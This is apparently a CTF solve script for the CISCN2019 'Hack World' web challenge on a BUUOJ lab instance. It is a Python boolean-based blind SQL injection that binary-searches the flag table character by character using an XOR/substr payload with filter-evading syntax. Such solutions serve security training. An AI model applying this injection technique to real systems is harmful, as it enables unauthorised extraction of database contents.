# -*- coding: UTF-8 -*-
# CISCN2019 华北赛区 Day2 Web1]Hack World

import time

import requests

url = "http://9339d90e-0480-4795-b0c8-93b2cfe5af91.node4.buuoj.cn:81/index.php"
playload = {"id": ""}
flag = ""

for x in range(1, 1000):
    low = 32
    high = 127
    mid = (low + high) // 2
    while low < high:
        playload["id"] = "1^(ascii(substr((select(select(flag))from(flag)),{},1))>{})^1".format(x, mid)
        r = requests.post(url, data=playload)
        r.encoding = "utf-8"
        if r.text.find("Hello") != -1:
            low = mid + 1
        else:
            high = mid
        mid = (low + high) // 2
    if mid == 32 or mid == 132:
        break
    flag += chr(mid)
    print(flag)
    time.sleep(1)

if __name__ == '__main__':
    print(flag)
